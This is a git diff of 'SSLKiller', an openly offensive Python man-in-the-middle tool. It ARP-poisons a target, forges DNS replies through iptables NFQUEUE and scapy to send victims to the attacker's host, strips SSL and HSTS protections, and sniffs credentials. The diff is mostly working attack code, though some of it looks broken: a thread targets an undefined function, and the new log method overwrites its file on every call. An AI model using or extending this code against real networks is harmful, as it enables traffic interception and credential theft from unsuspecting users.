@@ -19,7 +19,7 @@
 # Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
 # USA
 
-version = 0.2
+version = 0.3
 banner = """\n
 
   ██████   ██████  ██▓        ██ ▄█▀ ██▓ ██▓     ██▓
@@ -50,12 +50,18 @@ import sys
 import threading
 import fcntl
 import struct
+import random
 from time import sleep
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 
 
 class SSLKiller(object):
+	def log(self,msg):
+		f = open('sslkill.log','w')
+		f.write(msg)
+		f.close()
+
 	def __init__(self, interface, target, gateway):
 		print banner
 		print
@@ -130,7 +136,7 @@ class SSLKiller(object):
 		ArpThread()
 		#ArpPoison()
 
-	def SSLTrickster(self):
+	def DnsPoisoner(self):
 		#Use netfilterqueue + scapy to manipulate DNS and HTTP packets "
 		#in order to avoid preloaded HSTS lists, strip SSL links, "
 		#strip HTTP(s) protections (headers/scripts) and poison the "
@@ -139,31 +145,30 @@ class SSLKiller(object):
 		def callback(packet):
 			payload = packet.get_payload()
 			pkt = IP(payload)
-			if not pkt.haslayer(DNSQR):
+			if not pkt.haslayer(DNSQR) or not pkt.haslayer(DNSRR):
 				packet.accept()
-			else:
+			if pkt.haslayer(DNSQR):
 		        	new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                                	  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
-                                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.hostIP))
-                               	packet.set_payload(str(new_pkt))
-                                packet.accept()
-
-		def goThread():
-			t = threading.Thread(name='SSLTrickster', target=goTrickster)
+                               		  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                               	          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
+                               	          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.hostIP))
+                             	packet.set_payload(str(new_pkt))
+                               	packet.accept()
+			else:
+				packet.drop()
+		def DnsThread():
+			t = threading.Thread(name='DNSspoof', target=start)
 			t.setDaemon(True)
 			t.start()
 
-		def goTrickster():
+		def DnsPoison():
 			os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 			os.system('iptables -t nat -A PREROUTING -p udp --sport 53 -j NFQUEUE --queue-num 1')
-			os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j NFQUEUE --queue-num 1')
-			os.system('iptables -t nat -A PREROUTING -p tcp --sport 80 -j NFQUEUE --queue-num 1')
 			q = NetfilterQueue()
 			q.bind(1, callback)
 			q.run()
-		goThread()
-		#goTrickster()
+		DnsThread()
+		#DnsPoison()
 
 	def Sniffer(self, p):
 		#Sniff for credentials
